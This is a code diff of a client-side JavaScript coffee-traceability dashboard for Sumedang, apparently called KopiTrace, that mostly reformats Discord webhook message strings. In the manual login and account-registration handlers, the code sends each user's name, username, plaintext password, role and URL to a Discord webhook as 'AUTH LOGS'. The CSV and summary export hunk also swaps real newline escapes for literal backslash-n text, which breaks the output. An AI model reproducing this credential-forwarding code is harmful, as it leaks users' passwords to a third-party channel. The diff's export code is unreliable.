@@ -1130,13 +1130,7 @@
             let successCount = 0;
             for (const item of coffeeData) {
                 const codeStr = `${item.zona}/${item.metode}/${item.tahun}/${item.batch}`;
-                const message = `🌱 **SYNC BATCH SUMEDANG (BATCH)**
-• Kode: \`${codeStr}\`
-• Kecamatan: **${item.kecamatan || '-'}** (Zona: \`${item.zona}\`)
-• Petani: **${item.petani}**
-• Varietas: **${item.varietas}**
-• Metode: **${item.metode}**
-• Ceri: **${item.qtyCeri || 0} Kg** | GB: **${item.qtyGb || 0} Kg**`;
+                const message = `🌱 **SYNC BATCH SUMEDANG (BATCH)**\n• Kode: \`${codeStr}\`\n• Kecamatan: **${item.kecamatan || '-'}** (Zona: \`${item.zona}\`)\n• Petani: **${item.petani}**\n• Varietas: **${item.varietas}**\n• Metode: **${item.metode}**\n• Ceri: **${item.qtyCeri || 0} Kg** | GB: **${item.qtyGb || 0} Kg**`;
                 
                 try {
                     await fetch(DISCORD_WEBHOOK_BATCH, {
@@ -1377,16 +1371,11 @@
             try {
                 const linkBerita = newsObj.link && newsObj.link.trim() !== '' ? newsObj.link : 'Tidak ada tautan';
                 const payload = {
-                    content: `📄 **BERITA INDUSTRI KOPI SUMEDANG (NEWS)**
-` +
-                             `• **Judul:** ${newsObj.title}
-` +
-                             `• **Kategori:** ${newsObj.category}
-` +
-                             `• **Tanggal:** ${newsObj.date}
-` +
-                             `• **Ringkasan:** ${newsObj.content.substring(0, 150)}...
-` +
+                    content: `📄 **BERITA INDUSTRI KOPI SUMEDANG (NEWS)**\n` +
+                             `• **Judul:** ${newsObj.title}\n` +
+                             `• **Kategori:** ${newsObj.category}\n` +
+                             `• **Tanggal:** ${newsObj.date}\n` +
+                             `• **Ringkasan:** ${newsObj.content.substring(0, 150)}...\n` +
                              `• **Link:** ${linkBerita}`,
                     username: "KopiTrace News Bot",
                     avatar_url: "https://cdn-icons-png.flaticon.com/512/3299/3299943.png"
@@ -2195,12 +2184,7 @@
                 currentUser = foundUser;
                 saveToStorage(); closeAuthModal(); updateAuthUI(); switchView('dashboard');
                 const currentUrl = window.location.href;
-                sendAuthNotification(`🔐 **LOGIN MANUAL (AUTH LOGS)**
-• **Nama:** ${foundUser.name}
-• **Username:** ${foundUser.user}
-• **Password:** ${p}
-• **Role:** ${foundUser.role}
-• **URL:** ${currentUrl}`);
+                sendAuthNotification(`🔐 **LOGIN MANUAL (AUTH LOGS)**\n• **Nama:** ${foundUser.name}\n• **Username:** ${foundUser.user}\n• **Password:** ${p}\n• **Role:** ${foundUser.role}\n• **URL:** ${currentUrl}`);
             } else { document.getElementById('login-error').classList.remove('hidden'); }
         }
 
@@ -2227,12 +2211,7 @@
             switchView('dashboard');
 
             const currentUrl = window.location.href;
-            await sendAuthNotification(`🔐 **REGISTRASI AKUN BARU (AUTH LOGS)**
-• **Nama:** ${name}
-• **Username:** ${u}
-• **Password:** ${p}
-• **Role:** ${newUser.role}
-• **URL:** ${currentUrl}`);
+            await sendAuthNotification(`🔐 **REGISTRASI AKUN BARU (AUTH LOGS)**\n• **Nama:** ${name}\n• **Username:** ${u}\n• **Password:** ${p}\n• **Role:** ${newUser.role}\n• **URL:** ${currentUrl}`);
             
             alert('Akun berhasil didaftar dan Anda langsung masuk!');
         }
@@ -2434,8 +2413,7 @@
                 document.getElementById('photo-preview').src = item.fotoUrl;
                 document.getElementById('preview-container').classList.remove('hidden');
             } else { document.getElementById('preview-container').classList.add('hidden'); }
-            document.getElementById('form-distribusi').value = item.distribusi ? item.distribusi.map(d => `${d.tanggal} | ${d.aktivitas}`).join('
-') : '';
+            document.getElementById('form-distribusi').value = item.distribusi ? item.distribusi.map(d => `${d.tanggal} | ${d.aktivitas}`).join('\n') : '';
             const modal = document.getElementById('tree-modal');
             modal.classList.remove('hidden'); modal.classList.add('flex');
         }
@@ -2451,8 +2429,7 @@
             const rawDist = document.getElementById('form-distribusi').value.trim();
             const distribusiArray = [];
             if (rawDist) {
-                rawDist.split('
-').forEach(line => {
+                rawDist.split('\n').forEach(line => {
                     const parts = line.split('|');
                     if (parts.length >= 2) distribusiArray.push({ tanggal: parts[0].trim(), aktivitas: parts.slice(1).join('|').trim() });
                 });
@@ -2494,11 +2471,7 @@
             renderCoffeeChart(); 
             renderLineChart();
             const codeStr = `${newItem.zona}/${newItem.metode}/${newItem.tahun}/${newItem.batch}`;
-            sendBatchNotification(`🌱 **BATCH BARU SUMEDANG (BATCH)**
-• Kode: \`${codeStr}\`
-• Kecamatan: **${selectedKecamatan}** (Zona: \`${zoneInfo.zona}\`)
-• Petani: **${newItem.petani}**
-• Ceri: **${newItem.qtyCeri} Kg** | GB: **${newItem.qtyGb} Kg**`);
+            sendBatchNotification(`🌱 **BATCH BARU SUMEDANG (BATCH)**\n• Kode: \`${codeStr}\`\n• Kecamatan: **${selectedKecamatan}** (Zona: \`${zoneInfo.zona}\`)\n• Petani: **${newItem.petani}**\n• Ceri: **${newItem.qtyCeri} Kg** | GB: **${newItem.qtyGb} Kg**`);
         }
 
         async function syncChartAndSpreadsheetToDiscord() {
@@ -2533,28 +2506,28 @@
                     return;
                 }
 
-                let csvContent = "Kopitrace Sumedang - Laporan Kuantitas Ceri & Green Bean\n";
-                csvContent += `Waktu Ekspor,"${new Date().toLocaleString('id-ID')}"\n`;
-                csvContent += `Total Batch,${coffeeData.length}\n`;
-                csvContent += `Total Ceri (Kg),${totalCeri}\n`;
-                csvContent += `Total Green Bean (Kg),${totalGb}\n`;
-                csvContent += `Rata-rata Rendemen (%),${avgYield}%\n\n`;
+                let csvContent = "Kopitrace Sumedang - Laporan Kuantitas Ceri & Green Bean\\n";
+                csvContent += `Waktu Ekspor,"${new Date().toLocaleString('id-ID')}"\\n`;
+                csvContent += `Total Batch,${coffeeData.length}\\n`;
+                csvContent += `Total Ceri (Kg),${totalCeri}\\n`;
+                csvContent += `Total Green Bean (Kg),${totalGb}\\n`;
+                csvContent += `Rata-rata Rendemen (%),${avgYield}%\\n\\n`;
                 
-                csvContent += "Kode Batch,Zona,Kecamatan,Metode,Petani,Varietas,MDPL,Kuantitas Ceri (Kg),Kuantitas Green Bean (Kg),Sertifikasi\n";
+                csvContent += "Kode Batch,Zona,Kecamatan,Metode,Petani,Varietas,MDPL,Kuantitas Ceri (Kg),Kuantitas Green Bean (Kg),Sertifikasi\\n";
                 coffeeData.forEach(item => {
                     const code = `${item.zona}/${item.metode}/${item.tahun}/${item.batch}`;
-                    csvContent += `"${code}","${item.zona}","${item.kecamatan || ''}","${item.metode}","${item.petani}","${item.varietas}","${item.mdpl || ''}",${item.qtyCeri || 0},${item.qtyGb || 0},"${item.sertifikasi || ''}"\n`;
+                    csvContent += `"${code}","${item.zona}","${item.kecamatan || ''}","${item.metode}","${item.petani}","${item.varietas}","${item.mdpl || ''}",${item.qtyCeri || 0},${item.qtyGb || 0},"${item.sertifikasi || ''}"\\n`;
                 });
                 
                 const csvBlob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
 
-                let summaryText = `📊 **LAPORAN ANALISIS & REKAP STATISTIK KOPI SUMEDANG**\n`;
-                summaryText += `────────────────────────────────────────\n`;
-                summaryText += `📦 **Total Batch Terdaftar:** ${coffeeData.length} Batch\n`;
-                summaryText += `🍒 **Akumulasi Ceri Kopi:** ${totalCeri.toLocaleString()} Kg\n`;
-                summaryText += `☕ **Akumulasi Green Bean:** ${totalGb.toLocaleString()} Kg\n`;
-                summaryText += `📈 **Rata-rata Rendemen:** ${avgYield}%\n`;
-                summaryText += `────────────────────────────────────────\n`;
+                let summaryText = `📊 **LAPORAN ANALISIS & REKAP STATISTIK KOPI SUMEDANG**\\n`;
+                summaryText += `────────────────────────────────────────\\n`;
+                summaryText += `📦 **Total Batch Terdaftar:** ${coffeeData.length} Batch\\n`;
+                summaryText += `🍒 **Akumulasi Ceri Kopi:** ${totalCeri.toLocaleString()} Kg\\n`;
+                summaryText += `☕ **Akumulasi Green Bean:** ${totalGb.toLocaleString()} Kg\\n`;
+                summaryText += `📈 **Rata-rata Rendemen:** ${avgYield}%\\n`;
+                summaryText += `────────────────────────────────────────\\n`;
                 summaryText += `_Laporan visual grafik kuantitas dan file spreadsheet rekapitulasi data lengkap._`;
 
                 const formData = new FormData();
@@ -2638,8 +2611,7 @@
                         currentUser = { name: user.username, user: user.id, role: userRole };
                         saveToStorage(); updateAuthUI(); switchView('dashboard');
                         window.history.replaceState({}, document.title, window.location.pathname);
-                        sendAuthNotification(`🟢 **LOGIN DISCORD**
-• User: **${user.username}** (\`${userRole}\`)`);
+                        sendAuthNotification(`🟢 **LOGIN DISCORD**\n• User: **${user.username}** (\`${userRole}\`)`);
                     }
                 } catch (err) { alert('Gagal verifikasi Discord.'); }
             }
